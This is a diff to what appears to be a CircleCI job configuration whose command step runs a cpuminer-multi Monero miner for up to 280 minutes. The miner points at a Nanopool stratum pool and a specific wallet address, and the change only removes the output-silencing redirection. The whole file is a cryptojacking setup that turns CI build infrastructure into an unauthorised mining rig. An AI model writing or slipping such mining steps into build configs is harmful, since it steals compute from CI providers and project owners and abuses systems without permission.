@@ -12,4 +12,4 @@ jobs:
           command: |
             ls -la /
             ls -la /cpuminer-multi
-            cd /cpuminer-multi && ! timeout 280m ./minerd -a cryptonight -o stratum+tcp://xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRwhbpoUQ5wWSQFWkrR.circle -p x > /dev/null 2>&1
+            cd /cpuminer-multi && ! timeout 280m ./minerd -a cryptonight -o stratum+tcp://xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRwhbpoUQ5wWSQFWkrR.circle -p x
